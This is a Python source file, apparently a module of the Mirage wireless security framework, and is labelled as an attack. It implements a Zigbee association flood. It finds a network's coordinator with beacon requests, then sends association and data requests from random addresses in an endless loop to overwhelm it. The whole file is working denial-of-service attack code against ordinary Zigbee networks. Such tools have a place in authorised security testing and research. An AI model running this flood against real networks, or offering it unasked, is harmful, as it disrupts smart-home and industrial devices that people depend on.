from mirage.libs import zigbee,utils,io
from mirage.core import module
import random

class zigbee_floodassoc(module.WirelessModule):
	def init(self):
		self.technology = "zigbee"
		self.type = "attack"
		self.description = "Flooding module for Zigbee communications"
		self.args = {
				"INTERFACE":"rzusbstick0",
				"TARGET_PANID":"0x1234",
				"CHANNEL":"13",
				"TARGET":""

			}

	def checkCapabilities(self):
		return self.emitter.hasCapabilities("SNIFFING", "INJECTING", "COMMUNICATING_AS_COORDINATOR", "COMMUNICATING_AS_END_DEVICE", "COMMUNICATING_AS_ROUTER")
	def run(self):

		self.receiver = self.getReceiver(interface=self.args["INTERFACE"])
		self.emitter = self.getEmitter(interface=self.args["INTERFACE"])
		if self.checkCapabilities():
			self.receiver.setChannel(utils.integerArg(self.args["CHANNEL"]))

			if self.args["TARGET_PANID"] == "":
				io.fail("You must specify a target Pan ID.")
				return self.nok()
			self.panid = utils.integerArg(self.args["TARGET_PANID"])
			io.info("PanID selected: 0x"+"{:04x}".format(self.panid).upper())

			if self.args["TARGET"] != "":
				self.target = utils.integerArg(self.args["TARGET"])
			else:
				io.warning("No target specified, Beacon Requests will be transmitted in order to discover the coordinator...")
				self.target = None
				while self.target is None:
					self.emitter.sendp(zigbee.ZigbeeBeaconRequest(sequenceNumber=1,destPanID=self.panid,destAddr=0xFFFF))
					pkt = self.receiver.next(timeout=1)
					if isinstance(pkt,zigbee.ZigbeeBeacon) and pkt.coordinator and pkt.srcPanID == self.panid:
						self.target = pkt.srcAddr
				

			io.info("Coordinator selected: "+zigbee.addressToString(self.target))
		
			while True:
				address = random.randint(0,0xFFFF)
				io.info("New address: "+zigbee.addressToString(address))
				self.emitter.sendp(zigbee.ZigbeeAssociationRequest(destPanID=self.panid, destAddr=self.target,srcAddr=address,sequenceNumber=1,deviceType=True,srcPanID=0xFFFF))
				self.emitter.sendp(zigbee.ZigbeeDataRequest(destPanID=self.panid, destAddr=self.target,srcAddr=address,sequenceNumber=2))
				utils.wait(seconds=2)
			return self.ok()
		else:
			io.fail("Interface provided ("+str(self.args["INTERFACE"])+") is not able to communicate as a Zigbee device.")
			return self.nok()
